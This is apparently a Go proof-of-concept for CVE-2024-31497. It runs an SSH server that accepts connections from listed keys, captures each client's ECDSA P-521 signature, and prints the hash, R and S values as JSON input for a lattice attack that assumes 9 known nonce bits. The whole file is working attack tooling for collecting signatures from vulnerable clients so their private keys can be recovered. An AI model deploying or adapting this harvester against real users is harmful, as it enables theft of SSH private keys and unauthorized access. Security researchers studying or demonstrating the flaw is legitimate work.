package main

import (
	"crypto/ecdsa"
	"crypto/sha512"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net"
	"os"
	"strconv"
	"sync"

	"github.com/edutko/cve-2024-31497/internal/ssh"
)

func main() {
	address := "0.0.0.0:2022"
	if len(os.Args) > 1 {
		address = os.Args[1]
		if _, err := strconv.Atoi(os.Args[1]); err == nil {
			address = fmt.Sprintf("0.0.0.0:%s", os.Args[1])
		}
	}

	authorizedKeysBytes, err := os.ReadFile("authorized_keys")
	if err != nil {
		log.Fatalf("Failed to load authorized_keys, err: %v", err)
	}

	authorizedKeysMap := map[string]bool{}
	for len(authorizedKeysBytes) > 0 {
		pubKey, _, _, rest, err := ssh.ParseAuthorizedKey(authorizedKeysBytes)
		if err != nil {
			log.Fatal(err)
		}

		authorizedKeysMap[string(pubKey.Marshal())] = true
		authorizedKeysBytes = rest
	}

	config := &ssh.ServerConfig{
		PublicKeyCallback: func(c ssh.ConnMetadata, pubKey ssh.PublicKey) (*ssh.Permissions, error) {
			if authorizedKeysMap[string(pubKey.Marshal())] {
				return &ssh.Permissions{
					Extensions: map[string]string{
						"pubkey-fp": ssh.FingerprintSHA256(pubKey),
					},
				}, nil
			}
			return nil, fmt.Errorf("unknown public key for %q", c.User())
		},

		SignatureCallback: func(pk ecdsa.PublicKey, message []byte, sig *ssh.Signature) {
			if sig.Format == ssh.KeyAlgoECDSA521 {
				h := sha512.Sum512(message)
				var ecSig struct {
					R *big.Int
					S *big.Int
				}
				if err = ssh.Unmarshal(sig.Blob, &ecSig); err == nil {
					j, err := json.MarshalIndent(latticeAttackInfo{
						Curve:     "SECP521R1",
						PublicKey: []*big.Int{pk.X, pk.Y},
						KnownType: "MSB",
						KnownBits: 9,
						Signatures: []signature{{
							Hash: big.NewInt(0).SetBytes(h[:]),
							R:    ecSig.R,
							S:    ecSig.S,
							KP:   big.NewInt(0),
						}},
					}, "", "  ")
					if err == nil {
						fmt.Println(string(j))
					}
				}
			}
		},
	}

	privateBytes, err := os.ReadFile("id_rsa")
	if err != nil {
		log.Fatal("Failed to load private key: ", err)
	}

	private, err := ssh.ParsePrivateKey(privateBytes)
	if err != nil {
		log.Fatal("Failed to parse private key: ", err)
	}
	config.AddHostKey(private)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("failed to listen for connection: ", err)
	}
	for {
		err = acceptConnections(listener, config)
		if err != nil {
			log.Printf("error: %v", err)
		}
	}
}

func acceptConnections(listener net.Listener, config *ssh.ServerConfig) error {
	nConn, err := listener.Accept()
	if err != nil {
		return fmt.Errorf("failed to accept incoming connection: %w", err)
	}

	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		return fmt.Errorf("failed to handshake: %w", err)
	}
	defer conn.Close()

	var wg sync.WaitGroup
	defer wg.Wait()

	wg.Add(1)
	go func() {
		ssh.DiscardRequests(reqs)
		wg.Done()
	}()

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			return fmt.Errorf("Could not accept channel: %w", err)
		}

		wg.Add(1)
		go func(in <-chan *ssh.Request) {
			for req := range in {
				req.Reply(req.Type == "shell", nil)
			}
			wg.Done()
		}(requests)

		wg.Add(1)
		go func() {
			channel.Close()
			wg.Done()
		}()
	}

	return nil
}

type latticeAttackInfo struct {
	Curve      string      `json:"curve"`
	PublicKey  []*big.Int  `json:"public_key"`
	KnownType  string      `json:"known_type"`
	KnownBits  int         `json:"known_bits"`
	Signatures []signature `json:"signatures"`
}

type signature struct {
	Hash *big.Int `json:"hash"`
	R    *big.Int `json:"r"`
	S    *big.Int `json:"s"`
	KP   *big.Int `json:"kp"`
}
